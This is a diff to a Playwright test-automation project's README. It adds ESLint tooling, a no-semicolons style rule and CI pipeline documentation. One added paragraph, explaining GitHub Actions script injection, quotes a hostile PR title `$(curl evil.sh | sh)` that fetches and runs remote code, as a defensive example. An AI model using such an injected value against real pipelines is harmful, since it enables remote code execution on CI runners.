@@ -32,6 +32,7 @@ and REST API tests for [jsonplaceholder.typicode.com](https://jsonplaceholder.ty
 | [TypeScript](https://www.typescriptlang.org) | ^5.x | Type-safe test code |
 | [@faker-js/faker](https://fakerjs.dev) | ^8.4.1 | Test data generation |
 | [Allure Playwright](https://allurereport.org) | ^3.10.2 | Test reporting |
+| [ESLint](https://eslint.org) + [typescript-eslint](https://typescript-eslint.io) | ^10.x / ^8.x | Lint — required check in CI, run before every push |
 | [GitHub Actions](https://github.com/features/actions) | — | CI/CD pipeline |
 | [Docker](https://www.docker.com) | — | Consistent browser environment in CI |
 | [Groq API](https://console.groq.com) | — | AI-powered failure analysis |
@@ -101,8 +102,13 @@ project/
 │   ├── selectTests.ts                  Impact-based regression selection (ai:select)
 │   └── summarizeHealing.ts             Self-healing audit report (healing:summary)
 │
-├── .github/workflows/
-│   └── playwright.yml               ← CI/CD pipeline
+├── .github/
+│   ├── workflows/
+│   │   └── playwright.yml              CI/CD pipeline
+│   └── scripts/                        Notification/cleanup logic — kept out of the YAML
+│       ├── notify-telegram.sh             Untrusted values arrive via env, never spliced into the script
+│       └── cleanup-artifacts.js
+├── eslint.config.mjs                ← flat config, no-semicolons house style (npm run lint)
 ├── playwright.config.ts
 ├── package.json
 └── .gitignore
@@ -167,6 +173,19 @@ const { CartPage } = await import('../../pages')
 // ✅ Static import at the top of the file
 import { CartPage, CheckoutPage } from '../../pages'
 ```
+
+### 6. No semicolons
+
+```ts
+// ❌ semi: ['error', 'never'] — fails lint
+const total = await checkoutPage.getSummaryTotal();
+
+// ✅
+const total = await checkoutPage.getSummaryTotal()
+```
+
+Enforced by ESLint (`npm run lint`), not just convention — see
+[eslint.config.mjs](eslint.config.mjs). Required check in CI.
 
 ---
 
@@ -421,14 +440,19 @@ Tests run automatically on every `push` and `pull_request` to `main`.
 ```
 push / PR
     │
+    ├── lint            → npm run lint (required check, no AI, seconds)
+    │
     ├── test-e2e (4 shards in parallel, Docker)
     │     ├── Shard 1/4
-    │     ├── Shard 2/4
+    │     ├── Shard 2/4                → always: Self-Healing Summary
     │     ├── Shard 3/4  → on failure: AI Analysis (Groq)
     │     └── Shard 4/4
     │
     ├── test-api
     │     └── on failure: AI Analysis (Groq)
+    │
+    ├── risk-analysis   → PR only, advisory (never blocks)
+    │     └── ai:risk against the PR base branch → posted/updated as a PR comment
     │
     ├── merge-reports   → single Playwright HTML report
     │
@@ -437,6 +461,18 @@ push / PR
     │
     └── notify-telegram → status + Allure link + AI snippet
 ```
+
+`lint` and `test-e2e`/`test-api` are the required checks. `risk-analysis` is advisory
+only (`continue-on-error: true`) — see [Risk Analysis & Impact-Based Test
+Selection](#-risk-analysis--impact-based-test-selection) for why `ai:select`
+is deliberately *not* wired into CI at all.
+
+Notification and cleanup logic lives in `.github/scripts/`, not inline in the
+YAML — `notify-telegram.sh` in particular takes untrusted values (PR title,
+etc.) as env vars rather than `${{ }}`-interpolating them into the shell
+script text, which is a real GitHub Actions script-injection vector otherwise
+(a PR titled `` $(curl evil.sh | sh) `` would execute as shell if spliced in
+directly).
 
 ### Projects
 
